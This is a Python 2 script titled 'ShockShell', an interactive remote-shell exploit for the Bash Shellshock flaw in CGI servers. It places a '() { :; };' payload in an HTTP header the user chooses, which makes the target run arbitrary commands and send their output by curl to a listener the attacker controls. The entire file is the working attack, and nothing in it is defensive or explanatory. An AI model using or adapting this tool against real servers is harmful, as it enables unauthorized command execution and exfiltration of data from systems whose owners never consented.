#!/usr/bin/python

import argparse
import httplib
from urlparse import urlparse
from BaseHTTPServer import BaseHTTPRequestHandler
import SocketServer
import os
import signal

class PostHandler(SocketServer.ThreadingMixIn,BaseHTTPRequestHandler):
    
    def do_POST(self):
        content_len = int(self.headers.getheader('content-length', 0))
        shellResp = self.rfile.read(content_len)
        self.send_response(200)
        self.end_headers()
        self.wfile.write("")
        
        print shellResp
        return
        
def setGlobals():
    # Set global handler for HTTP PID
    global HTTPPid
    HTTPPid = 0

def parseArgs():
    parser = argparse.ArgumentParser(description='ShockShell - Bashing on BASH\nv0.01',add_help=True)
    parser.add_argument('-p', metavar='<HTTP listener port>',help='The port where the HTTP listener is running',required=True)
    parser.add_argument('-l', metavar='<ip address or hostname for HTTP listener>',help='Address or hostname for vulnerable server responses',required=True)
    parser.add_argument('-u', metavar='<Vulnerable URL>',help='Full URL, including protocol, to vulnerable CGI', required=True)
    parser.add_argument('--var', metavar='<Vulnerable header/variable',help='The variable/header value that will take the injected command', required=True)
    parser.add_argument('-m', metavar='<GET or POST>', help='The HTTP Method to use for each request', required=True)
    args= parser.parse_args()
    return args

def StartHTTPListener(interface,port):
    from BaseHTTPServer import HTTPServer
    print 'Starting Local Listener...'
    newpid = os.fork()
    if newpid == 0:
        HTTPPid = os.getpid()
        server = HTTPServer((interface,int(port)), PostHandler)
        server.serve_forever()

def ShellCmd(interface,port,url,var,method):
    cmd=raw_input(">>")
    if cmd == "exit":
        print "Closing Local Listener..."
        os.kill(HTTPPid,signal.SIGKILL)
        os.waitpid(HTTPPid,0)
        exit()
    else:
        RunCmd(cmd,interface,port,url,var,method)
        
def RunCmd(cmd,interface,port,url,var,method):
    u = urlparse(url)
    host = u.scheme + "://" + u.netloc
    if u.port:
        rPort = u.port
    else:
        rPort = 80
    body = ""
    headers = { var : "() { :; }; /usr/bin/curl -d `" + cmd + "` http://" + interface + ":" + port }
    try:
        conn = httplib.HTTPConnection(u.netloc,rPort)
        conn.request(method,u.path,body,headers)
        conn.close
    except socket.gaierror:
        print "Error connecting to " + u.netloc + ". Exiting..."
    
def main():
    options = parseArgs()
    setGlobals()
    StartHTTPListener(options.l,options.p)
    print "Initializing Shell...\nType 'exit' to end session."
    while True:
        ShellCmd(options.l,options.p,options.u,options.var,options.m)
    

# Run Main
if __name__ == '__main__':
    main()